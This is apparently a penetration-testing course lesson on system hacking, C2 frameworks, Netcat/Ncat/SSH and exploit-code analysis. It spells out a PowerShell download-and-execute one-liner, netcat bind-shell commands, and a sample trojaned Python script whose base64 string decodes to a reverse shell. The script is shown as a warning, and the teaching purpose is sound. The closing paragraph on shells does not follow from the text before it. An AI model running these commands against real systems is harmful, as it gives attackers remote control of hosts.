## Lesson Introduction
---
As part of the ethical hacking exercise, the PenTest team will conduct system hacking and, once in, attempt to get deeper into the system. The team can use a variety of methods in order to gain access into the system, including the use of remote access tools in order to begin this process. They could also leverage exploit code in order to download files and enumerate users and assets. In addition, the team will also analyze code by using debuggers such as Interactive Disassembler (IDA), Covenant, and various Software development kits (SDK).

## Lesson Objectives
---
In this lesson, you will:

- Describe techniques used to conduct system hacking and discover some of the tools used when exploiting PowerShell.
- Summarize remote access tools, such as secure shell (SSH), Ncat, and Netcat.
- Analyze exploit code in order to download files, launch remote access, and enumerate users and assets, along with employing debuggers, which can dynamically analyze system executables.

## Topic 14A - System Hacking
---
> [!note] Exam Objectives Covered
> *3.7 Given a scenario, perform post-exploitation techniques.*
> *5.3 Explain use cases of the following tools during the phases of a penetration test.*

As part of the penetration test, one of your goals and a key step will be to see if you can access different systems in order to obtain information. In the process of doing this, and especially if you are testing large networks, it will be ideal to manage the exploits you have available and keep control of the devices you have targeted.

Luckily, there are **command and control (C2)** frameworks that help you manage this as well as including a repository of exploits for you to leverage. Many of these exploits will leverage some component in the operating system, so before diving into exploitation code and the tools that can be used for system hacking, let’s take a look at some of the elements that can be leveraged during the penetration test.

### Running with .NET and .NET Framework
---
.**NET** (pronounced “dot net”, previously called .NET Core) is a cross-platform open-source software development framework and the successor of the original framework, actually called “.NET Framework”.

The original .NET Framework is still available and actively maintained but is not open-source and primarily oriented toward Windows development. In contrast, .NET (formerly .NET Core) is the preferred choice nowadays, as it can run on Windows, Linux, and macOS, offering the essential features of the original .NET Framework while also being cross-platform.

### Managing Windows with PowerShell
---
Windows PowerShell is a scripting language and shell for Microsoft® Windows® that is built on the .NET Framework. It is the default shell on Windows 10.

PowerShell offers much greater functionality than the traditional Windows command prompt. Like Bash, the PowerShell scripting language supports a wide variety of programming elements.

PowerShell scripts provide much the same benefits as Bash, though tailored to work with Windows environments and system utilities. PowerShell can make it easier for PenTesters to automate the process of exploiting the Registry, Active Directory objects, Group Policy, the Windows network stack, and more.

### Discovering Tools for System Hacking
---
***Empire*** is a C2 framework that makes use of PowerShell for common post-exploitation tasks on Windows. It also has a Python component for Linux. From the GitHub page:

“Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.” ( [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire) )

> [!warning] _Empire is now no longer maintained by the original developer. Maintenance is now handled by a group within Kali Linux. You can find the currently maintained version within Kali Linux called powershell-empire here:_ [_https://github.com/BC-SECURITY/Empire_](https://github.com/BC-SECURITY/Empire) .

Empire showed how easy it was to leverage PowerShell and became quite famous. However, its fame made defenders pay special attention to it, and with the lack of active development, the chances of this tool getting identified and/or blocked are high.

***Covenant*** is a .NET command and control framework and, in a similar fashion to Empire, it aims to show the attack surface of .NET and make attacks through this vector easier. .NET is cross-platform so Covenant can run on Windows, Linux, and MacOS ( [https://github.com/cobbr/Covenant](https://github.com/cobbr/Covenant) ).

Another cross-platform C2 framework to consider is ***Mythic***. Covenant and Mythic will work with all three of the aforementioned operating systems but, in particular, for Mythic, it contains payloads such as ***Apfell*** and ***Poseidon*** that provide consistently good results when PenTesting MacOS ( [https://github.com/its-a-feature/Mythic](https://github.com/its-a-feature/Mythic) ).

> [!warning] _For more information on other C2 frameworks and to find which one better fits your needs, go to:_ [_https://www.thec2matrix.com/_](https://www.thec2matrix.com/) .

There are also specific PowerShell tools like ***nishang*** ([https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)) that include a large set of scripts for Windows post-exploitation. Additionally, there are tools that don’t actually need access to _powershell.exe_ itself but rather use alternative methods of execution while retaining some or most of the functionality and, in some cases, adding even more.

Here are just a few examples:

|       **Name**       | **Link**                                      |
| :------------------: | --------------------------------------------- |
|  **`NoPowerShell`**  | https://github.com/bitsadmin/nopowershell     |
| **`PowerLessShell`** | https://github.com/Mr-Un1k0d3r/PowerLessShell |
|   **`PowerShdll`**   | https://github.com/p3nt4/PowerShdll           |
In any case, as you saw with Empire, tools may change and one of the duties performed by a good penetration testing team is to keep up with resources, especially as old ones are deprecated and new ones developed.

Another crucial task is understanding exploitation code by analyzing it, in order to get a better grasp of the attack. As we’ll see later in this lesson, this allows an ethical hacker to modify exploits for different use cases: even malware can be dissected, studied, altered, and re-purposed if needed.

Finally, developing solutions for leveraging scripts for a penetration test is an important skill to have, and it can also be used to automate the process as you will see in Lesson 15.

## Topic 14B - Use Remote Access Tools
---
> [!note] Exam Objectives Covered
> *3.1 Given a scenario, research attack vectors and perform wireless attacks.*
> *5.3 Explain use cases of the following tools during the phases of a penetration test.*

Telnet has been one of the most common tools to remotely access another computer, but it has a major caveat: it sends all communications, even login information, in plaintext. Even today, many devices such as IoT and ICS (industrial control systems) are engineered with efficiency and small size in mind, but that simplicity does not allow for modern, more secure, protocols so Telnet is used in its place.

Alternatively, in Linux based systems, there might be an `rlogin` or `rsh` service available that are similarly simple remote access tools. These tools are useful as a last resort but are limited in features that are useful for a penetration tester, especially when compared to other remote access tools like the ones we will discuss next.

### Exploring With Netcat
---
Netcat is a command-line utility used to read from or write to TCP, UDP, or Unix domain socket network connections. Highly versatile, it has been called the "Swiss Army knife" of hacking tools.

It can create or connect to a TCP server, act as a simple proxy or relay, transfer files, launch executables when a connection is made, test services and daemons, and even port scan. Netcat has been ported to most desktop platforms and has inspired similar tools such as Simple Netcat for Android and Ncat, which is covered next.

The basic syntax of Netcat is **`nc [options] [target address] [port(s)]`**. Common options include the following:

|  **Ncat Option**   | **Description**                                                                                                               |
| :----------------: | ----------------------------------------------------------------------------------------------------------------------------- |
|      **`-l`**      | Starts Netcat in listen mode. The <br>default mode is to act as a client.                                                     |
|      **`-u`**      | Starts Netcat in UDP mode. The <br>default is to use TCP.                                                                     |
|      **`-p`**      | Specifies the port that Netcat should <br>start listening on in listen mode. In <br>client mode it specifies the source port. |
|      **`-e`**      | Specifies the program to execute <br>when a connection is made.                                                               |
|      **`-n`**      | Tells Netcat not to perform DNS <br>lookups for host names on the <br>other end of the connection.                            |
|      **`-z`**      | Starts Netcat in zero I/O mode, <br>which instructs it to send a <br>packet without a payload.                                |
| **`-w <seconds>`** | Specifies the timeout value for <br>connections.                                                                              |
|      **`-v`**      | Starts Netcat in verbose mode.                                                                                                |
|     **`-vv`**      | Starts Netcat in very verbose mode.                                                                                           |

### Monitoring with Netcat
---
Ncat is a tool developed for Nmap as an improvement over Netcat. As such, you can use the same syntax when executing commands and the same options seen in Netcat’s options table. It can also act as a proxy, launch executables, and transfer files, but there is additional functionality with this tool that is key to a penetration tester. Notably, Ncat’s advantage over Netcat is the fact that it can encrypt communications with SSL so that the traffic is not visible to anyone on the network. This is of importance when exfiltrating files or sending commands that could alert defenders or defense systems of your presence, especially if they have advanced security systems that are analyzing traffic on the network.

### Communicating Within A Secure Shell
---
When it comes to encryption in communication, ***Secure Shell (SSH)*** is the perfect replacement for old technologies like Telnet and a great way to securely issue commands and copy files over an unsecured network. Much like Telnet, it is commonly used by system administrators to remotely manage servers and other devices. As a penetration tester, you need to be familiar with SSH, as it is frequently found on all computer systems. You should understand both its importance and how to exploit it. One issue with SSH is that, by default, you will need a credential to use it and, if configured with higher security levels, also a certificate and keypair.

In contrast to Netcat and Ncat, SSH was not developed with network testing in mind but still, with the multiple features and options available, it allows an ethical hacker to perform advanced tasks such as secure tunnels for pivoting, which you will explore in Lesson 16.

### Summarizing Remote Access Tools
---
The following is a summary table of the remote access tools discussed with command examples:

|    **Service**     | **Description**                                                                                                                                                                                                                                                                                                                                                                                            | **Examples**                                                 |
| :----------------: | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
|       Telnet       | An older remote protocol that does not support <br>encryption and is disabled on most modern systems. <br>However, some older or insecure systems may <br>still have this.                                                                                                                                                                                                                                 | **`telnet 192.168.1.50 12345`**                              |
|     rsh/rlogin     | A Linux command that is similar to Telnet, but if the <br>server has an `.rhosts` file configured a certain way, <br>you won't even need to supply credentials. The <br>`rsh` command can open a shell, but it also gives <br>you the ability to execute a command directly                                                                                                                                | **`rlogin 192.168.1.50`**<br>**`rsh 192.168.1.50 ifconfig`** |
|       Netcat       | Command-line utility used to read from or write to <br>TCP, UDP, or Unix domain socket network <br>connections. Highly versatile but does not <br>use encryption.                                                                                                                                                                                                                                          | **`netcat -lp 4444 -e /bin/bash`**                           |
|        Ncat        | Tool developed for Nmap as an improvement over <br>Netcat, not only retaining most of the functionality, <br>but also adding more, of which an important <br>one is support for SSL.                                                                                                                                                                                                                       | **`ncat 192.168.1.50 4444 -e cmd.exe`**                      |
| Secure Shell (SSH) | A modern answer to Telnet's lack of encryption <br>and other security mechanisms. Some systems <br>(particularly Linux systems) have SSH enabled by <br>default. If you know the credentials of an account <br>on the system you are trying to access, you can <br>use them to authenticate. However, some <br>configurations require the use of a digital <br>certificate and keypair for authentication. | **`ssh 192.168.1.50`**                                       |

## Topic 14C - Analyze Exploit Code
---
> [!note] Exam Objectives Covered
> *3.1 Given a scenario, research attack vectors and perform wireless attacks.*
> *5.2 Given a scenario, analyze script or code sample for use in a penetration test.*

In this section, we will look at different first steps to be taken during the process of system hacking.

Assuming you have already reviewed the preceding steps from prior lessons, and keeping in mind that more advanced steps will follow in the next lessons, it is now time for the crucial step of gaining entry and gathering some basic information for our subsequent procedures.

Additionally, we will look at examples of downloading and executing files, launching remote access tools, and enumerating users and assets.
<font style="color: red">VIDEO NEEDED</font>

### Downloading Files
---
Let’s start with something simple: downloading and executing a script.

We’ll show you how to create the script in the next step. For now, let’s focus on a single line of code that will give us leverage over our target:

`powershell.exe -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.0.100/run.ps1'))"`

Also known as a “one-liner,” these collapsed or simplified scripts can be quickly injected in many different ways, such as using macros in a word document that we sent as an attachment in a phishing email.

If we have physical access, we could use a USB implant, such as the famous USB Rubber Ducky, to quickly and automatically open a command-line and inject our one-liner.

On inspection, we see that the first element of our code is executing powershell.exe with the option -c, which tells PowerShell to execute the following command block or script and then exit. This command block will execute an element inside the parenthesis (after “IEX”, which creates a new connection to our specified attacker and downloads a file called “run.ps1”.

Now that we know how to download and execute, let’s see what our run.ps1 does and how to create it.

### Launching Remote Access
---
As discussed, we aim to get access inside our target device, and we have a way of injecting our one-liner from the previous segment so we only need to create the script that will be downloaded.

> [!warning] For simplicity, we first showed the one-liner and how to create the main script. In a real-life scenario, you need to make sure the script is created and accessible before injecting your code that will download it.

To create the script, we will use **msfvenom**, which is a very flexible and useful component of the Metasploit framework dedicated to generating many different payloads for different platforms and architectures:
![[Pasted image 20240612140443.png]]
*Metasploit msfvenom script creation*

Here, we specified the payload with the option **-p** and select “`reverse_powershell`” which is located inside “cmd/windows”.

> [!warning] _You will learn more about reverse and bind shells in Lesson 16. We also specify the IP of our attacker device and the port we’re listening to._

The result is much more complex than our one-liner.

Here you see the created script for reference:
![[Pasted image 20240612140532.png]]
*Metasploit msfvenom example script*

Note that two new options appeared at the beginning of the code: **-w hidden**, which hides the window, and **-nop** **,** which tells PowerShell not to load any particular profile, which may customize the way PowerShell behaves in the environment.

These two options are preferable for this stage of the exploitation, as we don’t want either profiles or visibility alerting anyone of what we’re doing.

We could also add the same options to our one-liner too. The rest of the generated code is even more complex but note that it is within a **while** loop.

You’ll learn more about these and how to use them in Lesson 15. For now just know that it will keep your script alive until it successfully connects, instead of running just once and stopping.

### Enumerating Users and Assets
---
For the enumeration of users and assets there are a series of tools that can be used. One of the most common is Meterpreter, an agent that is part of the Metasploit framework. These can be leveraged to enumerate users or assets.

User enumeration gathers information on users so you can attack using the usernames. Asset enumeration gathers information on assets so you attack them and **pivot** to them. Lateral movement is discussed in more detail in Lesson 16.

Additionally, as we discussed earlier in the lesson, certain Command and Control frameworks will come with additional tools and resources for these tasks. You will see more about these types of attacks in the last part of Lesson 16.

For now, let’s focus on another piece of exploitation code: a way of enumerating users from a website built on WordPress, a very well-known content management framework that is used to speed up and simplify the creation of websites. As people are rushing to build a website, they often do not take the extra steps to properly configure security.

One of the most common and simple attacks is the enumeration of users, which could then be used to attempt password techniques like the ones we’ll see in the first part of Lesson 16.

Here is part of the code we will be looking at, a WordPress user enumeration exploit:
![[Pasted image 20240612140842.png]]

Note that there’s a particular weakness where the enumeration exploit script references a URL. It asks the user for the main website to be scanned and adds some code to the URL adding a known location of a user file. What the script is doing is repeatedly going to that modified URL and copying the information about users. Which means if we were to go to that URL on any WordPress website that hasn't disabled that file, we will see the users.

This section is of note because if WordPress were to change the location of this file, it would make it seem as though this exploit no longer works. But a knowledgeable penetration tester that knows how to analyze and modify exploit code will be able to update the code and keep using it.

### Downloading Exploitation Code
---
As discussed in Lesson 9, there are databases and collections of exploits you can query and research. Usually, it will be preferable to download exploitation code from a reputable source, but there may be cases where we only seem to find it in a less reputable website or posted by an unknown user.

In those cases, take into consideration the possibility that a knowledgeable hacker that can develop this exploit probably has the skills necessary to add harmful code into it, with malicious intent, against anyone attempting to utilize the exploit.

Let’s assume we found a script from a less reputable source that claims to contain an exploit that was not found in any of the well-known databases and analyze in particular lines eight and ten of the following example of a harmful script:
``` python
1  #harmful script
2
3  import os
4  import base64
5
6  version = 1.2
7  url = "http://192.168.0.50/shellcode.bin"
8  check = "bmMgMTkyLjE2OC4wLjEwMCA0NDQ0IC1lIC9iaW4vYmFzaAo="
9
10  os.system(base64.b64decode(check))
11
12  def sendShellcode():
13  #download & prep shellcode
```

We see in line eight that a variable is defined, and in line ten that the same variable seems to be decoded using base64 and passed to **`os.system`** which will execute whatever the variable decodes to. If we were to decode it, we would find the following string that will later be run:

`nc 192.168.0.100 4444 -e /bin/bash`

This command will execute netcat, run bash, which is the command-line for Linux, and connect it to another host on the network, which will give the host control over the device that ran the script.

Publicly available exploitation codes exist for many different applications so it is highly likely you will be able to find one to use during a penetration test.

Typically, any application that the organization develops, maintains, or uses in-house will probably not have scripts freely available on the internet.

You may also find exploitation code difficult to find in the following situations:

- Recently patched version is no longer vulnerable to known exploits
- Uncommon/less known software and no publicly available exploits

For scenarios like these, you can use specific analysis techniques on compiled software to see if you can compromise any applications.

### Breaking Down A Program
---
Reverse engineering, as applied to software, is the process of breaking down a program into its base components in order to reveal more about how it functions. One example of reverse engineering is the attempt to analyze a program's implementation of digital rights management (DRM) copy protection mechanisms. If enough is learned about how the copy protection works at a lower level, it can be bypassed.

Even if you don't have access to an app's source code during your PenTest, you may be able to obtain the app's binaries or capture information about the app during execution. This can enable you to reverse engineer the app to look for potential weaknesses in design, programming, or implementation.

When it comes to software, there are three primary methods of performing reverse engineering:
- decompilation
- disassembly
- debugging

**Decompilation** is the reverse engineering process of translating an executable into high-level source code. This typically involves translating the machine language code of compiled binaries into the source code that the software was written in, before being run through a compiler. However, decompilation can also involve translating intermediary bytecode, which is normally executed by an interpreter, into the original source code.

Being able to deconstruct an executable into its source code means that you don't just need to rely on dynamic analysis to test a target app. You can use it to recover lost source code, as well as examine malware. You can also perform **static code analysis** to correct errors.

Decompiling an app will help you determine whether the app's logic will produce unintended results, if the app uses insecure libraries and APIs, and whether the app exhibits any of the other poor coding practices that developers can fall prey to.

Some apps are easier to deconstruct than others. For example, the nature of the class files in the Java programming language enables them to be easily decompiled into source code. You can, therefore, reverse engineer apps written in Java with freely available, easy-to-use tools.

However, some languages and third-party tools are designed to obfuscate source code before it is compiled. Obfuscated code is difficult to dissect because it uses convoluted and non-straightforward expressions that are not friendly to human analysis.

For example, the name of a string variable in the source code might be something simple and self-explanatory like **count**, but in the decompiled code, it may appear as a seemingly random combination of numbers, like **42893285936546456421324**. This makes it more difficult for a human reviewer to understand and retain the variable's purpose, as well as trace the variable throughout the code.

**Disassembly** is the reverse engineering process of translating low-level machine code into higher level assembly language code. Assembly language is lower level than typical source code, but it is still human readable and can include familiar programming elements like variables, functions, and even comments. Like decompilation, the purpose of disassembly is to better understand how an app functions in ways that might not be visible during normal execution. A tool that performs disassembly is called a disassembler.

Disassembly certainly has its disadvantages when compared to decompilation. Assembly code is not as concise as high-level code: it is more repetitive; the linear flow of the code is not as well structured; and, of course, it requires knowledge of assembly, which not many people possess.

However, disassemblers tend to be more common than decompilers, because accurate decompilation is difficult. Likewise, disassembly is deterministic, in other words, a machine code instruction will always translate to the same assembly instruction. In decompilation, translating one machine code instruction can result in multiple different high-level expressions.

**Debugging** is the process of manipulating a program's running state in order to analyze it for general bugs, vulnerabilities, and other issues. You manipulate its running state by stepping through, halting, or otherwise modifying portions of the program's underlying code, directly affecting the program as it executes.

Debuggers are common in integrated development environments (IDEs) for developers to debug code as they write or test it, but they can also be used on compiled software as a form of interactive reverse engineering. Debuggers can include a decompiler for modification of source code but, more commonly, they include a disassembler for modification of assembly instructions during execution.

Debugging can aid a PenTest because it not only translates machine code for static analysis, but also enables you to change that code and perform dynamic analysis on the program to see its effect. This can make it much easier to understand how an app functions and how it might be vulnerable.

A software development kit (SDK) is a package of tools dedicated to a specific programming language or platform commonly used by developers while creating applications because it comes with a collection of elements needed for that task and, in many cases, includes a debugger.

An example of this is the development kit for Windows and its debugger, WinDbg. There are different versions of the SDK according to which Windows version you are working on, but they all come bundled with the Windows debugger.

Additionally, SDKs may contain other elements that you can leverage during your assessment that will let you develop and compile your own tools for a particular programming language or platform.

The following table summarizes some popular disassembler/debugger tools:

|            **Type**            | **Description**                                                                                                                                                            |
| :----------------------------: | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|            OllyDbg             | A debugger included with Kali Linux that <br>analyzes binary code found in 32-bit <br>Windows applications.                                                                |
|       Immunity Debugger        | A debugger that includes both CLIs <br>and GUIs and that can load and <br>modify Python scripts during <br>runtime.                                                        |
|       GNU Debugger (GDB)       | An open-source debugger that works <br>on most Unix and Windows versions, <br>along with MacOS.                                                                            |
|             WinDbg             | A free debugging tool created <br>and distributed by Microsoft for <br>Windows operating systems.                                                                          |
| Interactive Disassembler (IDA) | A commercial disassembler and debugging <br>tool with support for numerous processors <br>and file formats. It has a limited free version.                                 |
|             Ghidra             | An open-source reverse engineering tool <br>developed by the NSA. It has a disassembler <br>and decompiler component and can make <br>use of GDB and WinDbg for debugging. |
|            Covenant            | An open-source .NET framework with a <br>focus on penetration testing but has a <br>development and debugging component.                                                   |

There are a couple of problems with this type of shell. For one, this listener is open for other users to take advantage of as well. In addition, if our target is behind a firewall and/or NAT, we might not be able to get to the target. There is another type of shell which can help in these situations, **Reverse Shell**.